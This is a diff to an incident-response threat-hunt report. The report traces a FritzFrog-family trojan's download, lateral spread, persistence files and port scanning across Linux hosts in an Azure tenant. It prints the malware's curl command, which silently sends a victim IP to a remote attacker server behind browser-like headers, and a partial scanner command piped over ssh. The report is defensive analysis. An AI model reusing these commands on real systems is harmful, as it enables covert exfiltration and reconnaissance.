@@ -357,6 +357,164 @@ cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tm
 
 ---
 
+### February 20, 2025 — Multiverze Trojan Deployment & Lateral Spread
+
+**Devices Involved:**  
+- `Levi-Linux-Vulnerability`  
+- `Linux-Vuln-Test-Jonz`
+
+**Observed Activity:**  
+The compromised device `Levi-Linux-Vulnerability` downloaded a file named `YAvdMwRw` from IP `128.199.194.30`. This file is identified as **Multiverze** malware, part of the **FritzFrog** trojan family known for infecting Linux systems via SSH and spreading laterally using a peer-to-peer (P2P) network — explaining how it’s propagating within the Azure tenant.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/00469dee-993a-4b76-b3f1-7407a12a766c" width="700"/>
+</p>
+
+**Subsequent Behavior:**  
+Execution of `YAvdMwRw` created two additional malicious files, `retea` and `Update`, both previously observed in the `initial-threat-hunt.md` analysis.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/a2fa0fb0-e5ac-46d8-ba73-4c4b7b9b48fb" width="800"/>
+  <img src="https://github.com/user-attachments/assets/e3f3e114-4f26-4ef2-9e99-542552d52da9" width="800"/>
+</p>
+
+**Malicious Scripts Revisited:**  
+The same malicious bash script identified earlier was re-used, executing `retea` and `network`, creating `kuak` and `diicot`, terminating known miner processes, disabling scheduled tasks, clearing logs, and downloading further payloads.
+
+**Concise Summary:**  
+The script disables security measures and system tasks, downloads a remote payload, clears logs, modifies system limits, harvests credentials, and uses the `network` loader script to finalize compromise.
+
+**Persistence & Obfuscation:**  
+Shortly after, the `Update` file was seen re-creating a `cache` file used to hide malicious activity and maintain persistence.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/dc9c1b26-4a05-4dde-8f13-46d825babc43" width="800"/>
+  <img src="https://github.com/user-attachments/assets/153793e0-53f0-4a85-850a-17d1dd9472fe" width="800"/>
+</p>
+
+**VirusTotal Scores:**
+- IP `128.199.194.30`: **8/94**  
+- File `YAvdMwRw`: **34/64**  
+- `retea`: **23/64**  
+- `Update`: **27/63**
+
+---
+
+### March 4 & 7, 2025 — File Ingress & Persistence Mechanisms
+
+#### March 4, 2025
+
+**Device Involved:**  
+- `Linux-Program-Fix`
+
+**Observed Activity:**  
+A file named `cache` was transferred from IP `170.64.230.111` to the `/tmp` directory via SCP.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/d243bb56-63b2-4d7f-81c4-fb029943f9ba" width="700"/>
+</p>
+
+**Subsequent Behavior:**  
+An additional file `MNFlEGNm` appeared and was executed, reflecting naming similarities to earlier malicious files like `UpzBUBnv`.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/14996335-df77-4ee9-bbba-8bc6ec6198b5" width="800"/>
+</p>
+
+**Malicious Activity:**  
+Execution of both `cache` and `MNFlEGNm` triggered a hidden process `.b`, likely associated with persistence via `cron` jobs.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/55ac6de8-403f-42d6-b11f-b8035455a84f" width="800"/>
+</p>
+
+#### March 7, 2025
+
+**Device Involved:**  
+- `linux-programatic-ajs`
+
+**Observed Activity:**  
+A similar file ingress from IP `196.251.88.103` deposited `cache` in `/tmp`.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/6beead87-7cfc-4c3b-8bcf-5010a5f06bc9" width="700"/>
+</p>
+
+**Subsequent Behavior:**  
+File `AqsEUmKy` was introduced and executed, mirroring previous obfuscated naming conventions. Simultaneously, a hidden `History` script was executed within `.update-logs`, followed by `Update` — likely to establish persistence.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/60a1fa32-8ccd-421b-9176-89533271eb84" width="700"/>
+</p>
+
+**More Activity:**  
+A file named `.bisis` was created, tagged as **PUA.Portscan**, typically used for network reconnaissance.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/2be455e3-a82d-4876-91b2-639c5ffcf726" width="700"/>
+</p>
+
+**VirusTotal Scores:**
+- IP `170.64.230.111`: **3/94**  
+- `.bisis`: **N/A**  
+- Others: **N/A**
+
+---
+
+### March 8, 2025 — Covert Data Exfiltration
+
+**Device Involved:**  
+- `linux-programatic-ajs`
+
+**Observed Activity:**  
+`Update` executed a `curl` command to silently send the device’s IP address (`103.108.140.172`) to a remote server (`196.251.73.38:47`), using browser-like headers to disguise the traffic.
+
+```bash
+curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" \\
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \\
+  -H "Accept-Language: en-US,en;q=0.9" \\
+  -H "Cache-Control: max-age=0" \\
+  -H "Connection: keep-alive" \\
+  -H "Upgrade-Insecure-Requests: 1" \\
+  --insecure
+```
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/f780335a-18a6-4043-863c-23c756c3439b" width="700"/>
+</p>
+
+**VirusTotal Scores:**
+- `Update`: **N/A**  
+- IP `196.251.73.38:47`: **N/A**  
+- IP `103.108.140.172`: **N/A**
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ## Gaps and Observations
 
 ### 🔍 Strengths
